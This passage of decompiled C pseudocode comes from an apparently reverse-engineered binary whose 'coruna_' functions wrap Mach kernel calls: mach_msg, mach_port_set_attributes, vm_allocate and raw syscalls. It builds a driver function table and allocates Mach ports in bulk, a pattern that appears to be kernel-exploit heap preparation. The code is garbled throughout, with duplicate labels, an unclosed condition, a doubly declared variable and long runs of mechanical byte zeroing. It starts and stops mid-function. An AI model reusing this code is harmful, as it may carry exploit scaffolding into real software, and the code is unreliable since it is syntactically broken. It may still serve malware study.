                      *count_2 = status;
                      }
                      status = 0x28029;
                      if (err || err != 0) {
                      status = err;
                      }
                      return status;
                    }
                  }
                  scratch = err;
                  if (u == 1) {
                    thread_attr = coruna_u64_pack((thread_attr), (thread_attr));
                  }
                }
              }
              else if (err || status) {
                if (((type_id == (flags[2] + version) - 1) &&
                    (*(char *)((long)flags + 0x69) == '\0')) &&
                   err = false;
                   err = 0x28012;
                   status = bootargs;
                   if (count_2 != (int *)0x0) {
                   skip:
                   *count_2 = status;
                   }
                   status = 0x28029;
                   if (err || err != 0) {
                   status = err;
                   }
                   return status;
              }
            }
          }
          else {
            bootargs = status;
            if ((flags_2 & 1) != 0) {
              err = false;
              err = 0x2803e;
              goto skip;
            }
          }
          type_id = type_id + 1;
        } while ((*ptr < (uint)buf[2]) &&
                (kind = tag, version = port, type_id < size));
        size = (unsigned long)(uint)flags[0x19];
      }
      type_id_8 = type_id_8 + 1;
    } while (type_id_8 < size);
    err = 0;
fail:
    err = false;
  }
  else {
    err = 0;
    err = false;
  }
check_ok:
  status = bootargs;
  if (count_2 != (int *)0x0) {
skip:
    *count_2 = status;
  }
  status = 0x28029;
  if (err || err != 0) {
    status = err;
  }
  return status;
}





void coruna_helper_17c24_294e4(void)
{
  coruna_kernel29bb0_via_host_priv_statistics_2();
  return;
}





unsigned long coruna_kernel29bb0_via_mach_msg_2(uint64_t arg,long val,int n,int *m)

{
  uint port;
  int err;
  unsigned long u;
  long addr;
  int count;
  unsigned long type_id_16;
  uint type_id;
  unsigned long version;
  
  if (*(char *)(val + 0x68) != '\0' && n == 0) {
    err = 0;
    type_id_16 = 0;
    if (m != (int *)0x0) {
    *m = err;
    }
    return type_id_16;
  }
  u = (unsigned long)*(uint *)(val + 100);
  if (*(uint *)(val + 100) != 0) {
    type_id_16 = 0;
    addr = *(long *)(val + 0x58);
    do {
      if (*(int *)(addr + type_id_16 * 0xc + 8) != 0) {
        type_id = 0;
        do {
          u = coruna_mach_msg(val + 0x40,0,*(uint32_t *)(addr + type_id_16 * 0xc),1);
          if ((int)u != 0) {
            return u;
          }
          type_id = type_id + 1;
          addr = *(long *)(val + 0x58);
        } while (type_id < *(uint *)(addr + type_id_16 * 0xc + 8));
        u = (unsigned long)*(uint *)(val + 100);
      }
      type_id_16 = type_id_16 + 1;
    } while (type_id_16 < u);
  }
  if (m == (int *)0x0) {
    count = 0;
    err = 0;
    if ((int)u != 0) goto load_ok_35;
load_ok_36:
    type_id_16 = 0;
  }
  else {
    err = coruna_kernel29bb0_residual_163();
    u = (unsigned long)*(uint *)(val + 100);
    count = err;
    if (*(uint *)(val + 100) == 0) goto load_ok_36;
load_ok_35:
    version = 0;
    type_id_16 = 0;
    addr = *(long *)(val + 0x58);
    err = count;
    do {
      if (*(int *)(addr + version * 0xc + 8) != 0) {
        type_id = 0;
        do {
          u = coruna_mach_msg_15000(val + 0x40,*(uint32_t *)(addr + version * 0xc));
          if ((int)u != 0) {
            return u;
          }
          if (m != (int *)0x0) {
            err = coruna_kernel29bb0_residual_163();
            port = (uint)type_id_16;
            if (count != err) {
              port = 0x2803e;
            }
            type_id_16 = (unsigned long)port;
          }
          type_id = type_id + 1;
          addr = *(long *)(val + 0x58);
        } while (type_id < *(uint *)(addr + version * 0xc + 8));
        u = (unsigned long)*(uint *)(val + 100);
      }
      version = version + 1;
    } while (version < u);
  }
  *(uint8_t *)(val + 0x68) = 1;
joined_r0x00029630:
  if (m != (int *)0x0) {
    *m = err;
  }
  return type_id_16;
}





void coruna_call_mach_msg_27d70_29680(uint64_t val,uint64_t id_2)
{
  coruna_kernel29bb0_via_mach_msg_2(val,id_2,0,0);
  return;
}





unsigned long coruna_mach_port_set_attributes_2a850(long arg,uint val,uint n,uint m,uint p,int q,
                  uint64_t *r)

{
  uint *ptr;
  int err;
  long serial_11;
  int i;
  uint kind;
  uint type_id_16;
  uint type_id;
  uint8_t *str;
  byte j;
  uint type_id_9;
  uint type_id_10;
  uint *entry;
  unsigned long type_id_11;
  mach_port_name_t *name;
  long serial_12;
  uint type_id_17;
  unsigned long type_id_13;
  unsigned long type_id_14;
  vm_address_t block_ctx;
  uint scratch [2];
  
  type_id_14 = 0xad009;
  entry = _calloc(1,0x70);
  if (entry != (uint *)0x0) {
    entry[1] = val;
    type_id_9 = *(uint *)(arg + 0x180);
    type_id_10 = 0;
    if (type_id_9 != 0) {
      type_id_10 = val / type_id_9;
    }
    type_id_17 = val;
    if (val != type_id_10 * type_id_9) {
      type_id_17 = type_id_9;
      for (type_id_10 = type_id_9 << 1; type_id_10 < 0x8001; type_id_10 = type_id_10 + type_id_9) {
        kind = 0;
        if (val != 0) {
          kind = type_id_10 / val;
        }
        type_id_16 = 0;
        if (type_id_10 != 0) {
          type_id_16 = ((type_id_10 - kind * val) * 100) / type_id_10;
        }
        kind = 0;
        if (val != 0) {
          kind = type_id_17 / val;
        }
        type_id = 0;
        if (type_id_17 != 0) {
          type_id = ((type_id_17 - kind * val) * 100) / type_id_17;
        }
        kind = type_id_10;
        if (type_id <= type_id_16) {
          kind = type_id_17;
        }
        type_id_17 = kind;
      }
    }
    type_id_9 = 0;
    if (val != 0) {
      type_id_9 = type_id_17 / val;
    }
    entry[2] = type_id_9;
    *entry = type_id_17;
    entry[4] = p;
    j = coruna_host_priv_statistics_11020(arg);
    *(byte *)((long)entry + 0x69) = j ^ 1;
    entry[5] = n;
    block_ctx = 0;
    type_id_13 = *(unsigned long *)k_kernel_vm_page_size_slot;
    type_id_11 = 0;
    if (type_id_13 != 0) {
      type_id_11 = val / type_id_13;
    }
    serial_12 = (unsigned long)val - type_id_11 * type_id_13;
    serial_11 = 0;
    if (serial_12 != 0) {
      serial_11 = type_id_13 - serial_12;
    }
    type_id_9 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&block_ctx,
                          serial_11 + (unsigned long)val,1);
    type_id_11 = (unsigned long)type_id_9;
    if (type_id_9 == 0) {
      *(vm_address_t *)(entry + 6) = block_ctx;
      *(unsigned long *)(entry + 8) = serial_11 + (unsigned long)val;
      ptr = entry + 10;
      type_id_11 = coruna_buf_init(ptr);
      type_id_13 = type_id_11;
      if ((int)type_id_11 == 0) {
        if (entry[5] != 0) {
          type_id_9 = 0;
          do {
            if (q == 0) {
              type_id_10 = 0;
              if (*(uint *)(arg + 0x168) != 0) {
                type_id_10 = entry[1] / *(uint *)(arg + 0x168);
              }
              type_id_11 = coruna_kernel29bb0_via_buf_grow_2(ptr,block_ctx,type_id_10);
            }
            else {
              type_id_11 = coruna_helper_1be68_17f28(ptr,block_ctx,entry[1]);
            }
            type_id_13 = type_id_11;
            if ((int)type_id_11 != 0) goto load_ok_37;
            type_id_9 = type_id_9 + 1;
          } while (type_id_9 < entry[5]);
        }
        type_id_11 = coruna_call_helper_1b984(entry + 0x10,0x10);
        type_id_13 = type_id_11;
        if ((int)type_id_11 == 0) {
          scratch[0] = 0;
          type_id_9 = 0;
          if (m != 0) {
            type_id_9 = p / m;
          }
          i = p - type_id_9 * m;
          err = 0;
          if (i != 0) {
            err = m - i;
          }
          type_id_9 = 0;
          if (m != 0) {
            type_id_9 = (err + p) / m;
          }
          name = _calloc((unsigned long)type_id_9,0xc);
          type_id_11 = 0;
          type_id_13 = type_id_14;
          if (name != (mach_port_name_t *)0x0) {
            *(mach_port_name_t **)(entry + 0x16) = name;
            str = k_kernel_mach_task_self_slot;
            if (m <= err + p) {
              type_id_14 = 0;
              if (type_id_9 < 2) {
                type_id_9 = 1;
              }
              do {
                type_id_10 = _mach_port_allocate(*(ipc_space_t *)str,1,name);
                if (type_id_10 != 0) {
load_ok_38:
                  type_id_11 = (unsigned long)type_id_10;
                  type_id_13 = (unsigned long)(type_id_10 | 0x80000000);
                  goto load_ok_37;
                }
                entry[0x19] = entry[0x19] + 1;
                scratch[0] = m;
                type_id_10 = _mach_port_set_attributes
                                   (*(ipc_space_t *)str,*name,1,(mach_port_info_t)scratch,1);
                if (type_id_10 != 0) goto load_ok_38;
                name[2] = m;
                type_id_14 = type_id_14 + 1;
                name = name + 3;
              } while (type_id_14 != type_id_9);
            }
            *r = entry;
            return 0;
          }
        }
      }
    }
    else {
      type_id_13 = (unsigned long)(type_id_9 | 0x80000000);
    }
load_ok_37:
    type_id_14 = type_id_13;
    coruna_mach_port_mod_refs(type_id_11,entry);
  }
  return type_id_14;
}





void coruna_call_mach_port_set_attributes_28f78(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_mach_port_set_attributes_2a850(val,id_2,1,0x400,size_3,0,off_4);
  return;
}





void coruna_mach_port_mod_refs_2ab4c_stub(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_mach_port_mod_refs_2ab4c(val,id_2,0,size_3,off_4);
  return;
}





void coruna_mach_port_mod_refs_2ab4c(long handle,uint64_t val,int flags,uint *size,uint flags_2)
{
  uint u;
  int err;
  uint size;
  uint8_t *ptr;
  unsigned long version;
  uint *buf;
  unsigned long port;
  unsigned long tag;
  mach_port_name_t scratch;
  uint bootargs;
  uint thread_attr [64];
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs = 0x40;
  err = coruna_kernel29478_via_u64_pack(handle,thread_attr,&bootargs);
  if (err == 0) {
    u = *(int *)(handle + 0x180) << 2;
    if (u < 0x4001) {
      u = 0x4000;
    }
    port = (unsigned long)bootargs;
    if (bootargs != 0) {
      tag = 0;
      do {
        size = thread_attr[tag];
        version = (unsigned long)flags_2;
        buf = size;
        if (flags_2 != 0) {
          do {
            if (size == *buf) goto fail;
            buf = buf + 1;
            version = version - 1;
          } while (version != 0);
        }
        if (size < u) {
          if (flags == 0) {
            ptr = (uint8_t *)
                     coruna_mach_port_set_attributes(size,*(uint32_t *)(handle + 0x168),val,&scratch);
            err = (int)ptr;
          }
          else {
            ptr = (uint8_t *)coruna_mach_port_set_attributes_28dd0(size,size,val,&scratch);
            err = (int)ptr;
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
          return;
          }
          ___stack_chk_fail(ptr);
        }
fail:
        tag = tag + 1;
      } while (tag != port);
    }
    ptr = (uint8_t *)0x0;
  }
  else {
    ptr = &k_kernel_rodata_word_2803d;
  }
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail(ptr);
}





int coruna_syscall(void)
{
  int err;
  
  err = _syscall(0x1e2);
  return err;
}





int coruna_mac_syscall(void)
{
  int err;
  
  err = _syscall(0x17d);
  return err;
}





int coruna_getattrlistbulk(void)
{
  int err;
  
  err = _syscall(0x1cd);
  return err;
}





int coruna_getattrlistbulk_29b50(void)
{
  int err;
  
  err = _syscall(0x206);
  return err;
}





unsigned long coruna_cpu_capabilities_base(void)

{
  return *(unsigned long *)(k_kernel_get_cpu_capabilities_slot + 0xc) & 0xffffffffffffff00;
}





uint64_t _driver(uint64_t *val)
{
  uint32_t *ptr;
  uint64_t u;
  
  u = 0xad001;
  if (val != (uint64_t *)0x0) {
    ptr = _calloc(1,0x50);
    if (ptr == (uint32_t *)0x0) {
      u = 0xad009;
    }
    else {
      u = 0;
      *ptr = 0x20002;
      ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_661c;
      ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_kernel29bb0_via_kernel29bb0_via_kernel09_via_vm_allocate;
      ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_kernel29bb0_via_call_plist_dict_36818;
      ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_call_surface_map;
      ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_call_surface_map_29d78;
      ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_driver_copy_port_1918;
      ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_kernel29bb0_residual_170;
      ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_parse_xnu_processors;
      *val = ptr;
    }
  }
  return u;
}





uint64_t coruna_ctx_free_661c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return 0;
  }
  return 0xad001;
}





uint64_t coruna_ctx_free_6624(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return 0;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_kernel09_via_vm_allocate(long handle,uint64_t val,uint64_t *id_2)
{
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  u = 0xad001;
  if (((handle != 0) && (id_2 != (uint64_t *)0x0)) &&
     (u = coruna_kernel29bb0_via_kernel09_via_vm_allocate(&scratch), (int)u == 0)) {
    *id_2 = scratch;
  }
  return u;
}





uint64_t coruna_kernel29bb0_via_call_plist_dict_36818(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_call_plist_dict_36818(addr_2,val);
    return u;
  }
  return 0xad001;
}





void coruna_call_plist_dict_36818_stub(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_call_plist_dict_36818(id_2,size_3);
  return;
}





uint64_t coruna_call_surface_map(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_mach_thread_self(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_call_surface_map_29d78(long handle,long addr_2)
{
  uint64_t u;
  
  if ((handle != 0) && (addr_2 != 0)) {
    u = coruna_pthread_mutex_destroy(addr_2);
    return u;
  }
  return 0xad001;
}





uint64_t coruna_driver_copy_port_1918(long handle,long addr_2,int *flags)
{
  uint64_t u;
  
  u = 0xad001;
  if (((handle != 0) && (addr_2 != 0)) && (flags != (int *)0x0)) {
    u = 0xad00a;
    if (1 < *(int *)(&k_kernel_slot_1918 + addr_2) + 1U) {
      *flags = *(int *)(&k_kernel_slot_1918 + addr_2);
      return 0;
    }
  }
  return u;
}





unsigned long coruna_kernel29bb0_residual_170(long arg,long *val,long n,uint m,uint p)

{
  long off;
  bool flags;
  uint u;
  unsigned long size;
  unsigned long kind;
  uint64_t *buf;
  uint type_id;
  long serial_buf;
  
  serial_buf = 0;
  size = 0xad001;
  if ((((arg != 0) && (val != (long *)0x0)) &&
      (((n != 0 && (m != 0)) || ((n == 0 && (m == 0)))))) &&
     ((off = *val, *val != 0 ||
      (size = (**(void (**)(arg + 0x18))(arg,0,&serial_buf), off = serial_buf, (int)size == 0
      )))) {
    serial_buf = off;
    if (m != 0) {
      kind = 0;
      size = 1;
      type_id = 1;
      buf = (uint64_t *)(n + 8);
      do {
        u = (**(void (**)(arg + 0x28))(arg,serial_buf,*(uint32_t *)(buf + -1),*buf)
        ;
        if (type_id == 0) {
          u = (uint)kind;
        }
        kind = (unsigned long)u;
        type_id = (uint)(u == 0);
        flags = size < m;
        size = size + 1;
        buf = buf + 2;
      } while ((p | type_id) == 1 && flags);
      if (u != 0) {
        if (*val != 0) {
          return kind;
        }
        if ((p & 1) == 0) {
          (**(void (**)(arg + 0x30))(arg,serial_buf);
        }
        (**(void (**)(arg + 0x20))(arg,serial_buf);
        return kind;
      }
    }
    size = 0;
    *val = serial_buf;
  }
  return size;
}





uint coruna_parse_xnu_processors(long handle,size_t *len)
{
  mach_port_t host;
  uint u;
  int err;
  uint size;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  int thread_attr [2];
  char host_info [512];
  
  size = 0xad014;
  if (handle == 0) {
    return 0xad001;
  }
  if (len == (size_t *)0x0) {
    return 0xad001;
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
  host_info[0x11a] = '\0';
  host_info[0x11b] = '\0';
  host_info[0x11c] = '\0';
  host_info[0x11d] = '\0';
  host_info[0x11e] = '\0';
  host_info[0x11f] = '\0';
  host_info[0x110] = '\0';
  host_info[0x111] = '\0';
  host_info[0x112] = '\0';
  host_info[0x113] = '\0';
  host_info[0x114] = '\0';
  host_info[0x115] = '\0';
  host_info[0x116] = '\0';
  host_info[0x117] = '\0';
  host_info[0xe8] = '\0';
  host_info[0xe9] = '\0';
  host_info[0xea] = '\0';
  host_info[0xeb] = '\0';
  host_info[0xec] = '\0';
  host_info[0xed] = '\0';
  host_info[0xee] = '\0';
  host_info[0xef] = '\0';
  host_info[0xe0] = '\0';
  host_info[0xe1] = '\0';
  host_info[0xe2] = '\0';
  host_info[0xe3] = '\0';
  host_info[0xe4] = '\0';
  host_info[0xe5] = '\0';
  host_info[0xe6] = '\0';
  host_info[0xe7] = '\0';
  host_info[0xf8] = '\0';
  host_info[0xf9] = '\0';
  host_info[0xfa] = '\0';
  host_info[0xfb] = '\0';
  host_info[0xfc] = '\0';
  host_info[0xfd] = '\0';
  host_info[0xfe] = '\0';
  host_info[0xff] = '\0';
  host_info[0xf0] = '\0';
  host_info[0xf1] = '\0';
  host_info[0xf2] = '\0';
  host_info[0xf3] = '\0';
  host_info[0xf4] = '\0';
  host_info[0xf5] = '\0';
  host_info[0xf6] = '\0';
  host_info[0xf7] = '\0';
  host_info[200] = '\0';
  host_info[0xc9] = '\0';
  host_info[0xca] = '\0';
  host_info[0xcb] = '\0';
  host_info[0xcc] = '\0';
  host_info[0xcd] = '\0';
  host_info[0xce] = '\0';
  host_info[0xcf] = '\0';
  host_info[0xc0] = '\0';
  host_info[0xc1] = '\0';
  host_info[0xc2] = '\0';
  host_info[0xc3] = '\0';
  host_info[0xc4] = '\0';
  host_info[0xc5] = '\0';
  host_info[0xc6] = '\0';
  host_info[199] = '\0';
  host_info[0xd8] = '\0';
  host_info[0xd9] = '\0';
  host_info[0xda] = '\0';
  host_info[0xdb] = '\0';
  host_info[0xdc] = '\0';
  host_info[0xdd] = '\0';
  host_info[0xde] = '\0';
  host_info[0xdf] = '\0';
  host_info[0xd0] = '\0';
  host_info[0xd1] = '\0';
  host_info[0xd2] = '\0';
  host_info[0xd3] = '\0';
  host_info[0xd4] = '\0';
  host_info[0xd5] = '\0';
  host_info[0xd6] = '\0';
  host_info[0xd7] = '\0';
  host_info[0xa8] = '\0';
  host_info[0xa9] = '\0';
  host_info[0xaa] = '\0';
  host_info[0xab] = '\0';
  host_info[0xac] = '\0';
  host_info[0xad] = '\0';
  host_info[0xae] = '\0';
  host_info[0xaf] = '\0';
  host_info[0xa0] = '\0';
  host_info[0xa1] = '\0';
  host_info[0xa2] = '\0';
  host_info[0xa3] = '\0';
  host_info[0xa4] = '\0';
  host_info[0xa5] = '\0';
  host_info[0xa6] = '\0';
  host_info[0xa7] = '\0';
  host_info[0xb8] = '\0';
  host_info[0xb9] = '\0';
  host_info[0xba] = '\0';
  host_info[0xbb] = '\0';
  host_info[0xbc] = '\0';
  host_info[0xbd] = '\0';
  host_info[0xbe] = '\0';
  host_info[0xbf] = '\0';
  host_info[0xb0] = '\0';
  host_info[0xb1] = '\0';
  host_info[0xb2] = '\0';
  host_info[0xb3] = '\0';
  host_info[0xb4] = '\0';
  host_info[0xb5] = '\0';
  host_info[0xb6] = '\0';
  host_info[0xb7] = '\0';
  host_info[0x88] = '\0';
  host_info[0x89] = '\0';
  host_info[0x8a] = '\0';
  host_info[0x8b] = '\0';
  host_info[0x8c] = '\0';
  host_info[0x8d] = '\0';
  host_info[0x8e] = '\0';
  host_info[0x8f] = '\0';
  host_info[0x80] = '\0';
  host_info[0x81] = '\0';
  host_info[0x82] = '\0';
  host_info[0x83] = '\0';
  host_info[0x84] = '\0';
  host_info[0x85] = '\0';
  host_info[0x86] = '\0';
  host_info[0x87] = '\0';
  host_info[0x98] = '\0';
  host_info[0x99] = '\0';
  host_info[0x9a] = '\0';
  host_info[0x9b] = '\0';
  host_info[0x9c] = '\0';
  host_info[0x9d] = '\0';
  host_info[0x9e] = '\0';
  host_info[0x9f] = '\0';
  host_info[0x90] = '\0';
  host_info[0x91] = '\0';
  host_info[0x92] = '\0';
  host_info[0x93] = '\0';
  host_info[0x94] = '\0';
  host_info[0x95] = '\0';
  host_info[0x96] = '\0';
  host_info[0x97] = '\0';
  host_info[0x78] = '\0';
  host_info[0x79] = '\0';
  host_info[0x7a] = '\0';
  host_info[0x7b] = '\0';
  host_info[0x7c] = '\0';
  host_info[0x7d] = '\0';
  host_info[0x7e] = '\0';
  host_info[0x7f] = '\0';
  host_info[0x70] = '\0';
  host_info[0x71] = '\0';
  host_info[0x72] = '\0';
  host_info[0x73] = '\0';
  host_info[0x74] = '\0';
  host_info[0x75] = '\0';
  host_info[0x76] = '\0';
  host_info[0x77] = '\0';
  host_info[0x58] = '\0';
  host_info[0x59] = '\0';
  host_info[0x5a] = '\0';
  host_info[0x5b] = '\0';
  host_info[0x5c] = '\0';
  host_info[0x5d] = '\0';
  host_info[0x5e] = '\0';
  host_info[0x5f] = '\0';
  host_info[0x50] = '\0';
  host_info[0x51] = '\0';
  host_info[0x52] = '\0';
  host_info[0x53] = '\0';
  host_info[0x54] = '\0';
  host_info[0x55] = '\0';
  host_info[0x56] = '\0';
  host_info[0x57] = '\0';
  host_info[0x68] = '\0';
  host_info[0x69] = '\0';
  host_info[0x6a] = '\0';
  host_info[0x6b] = '\0';
  host_info[0x6c] = '\0';
  host_info[0x6d] = '\0';
  host_info[0x6e] = '\0';
  host_info[0x6f] = '\0';
  host_info[0x60] = '\0';
  host_info[0x61] = '\0';
  host_info[0x62] = '\0';
  host_info[99] = '\0';
  host_info[100] = '\0';
  host_info[0x65] = '\0';
  host_info[0x66] = '\0';
  host_info[0x67] = '\0';
  host_info[0x38] = '\0';
  host_info[0x39] = '\0';
  host_info[0x3a] = '\0';
  host_info[0x3b] = '\0';
  host_info[0x3c] = '\0';
  host_info[0x3d] = '\0';
  host_info[0x3e] = '\0';
  host_info[0x3f] = '\0';
  host_info[0x30] = '\0';
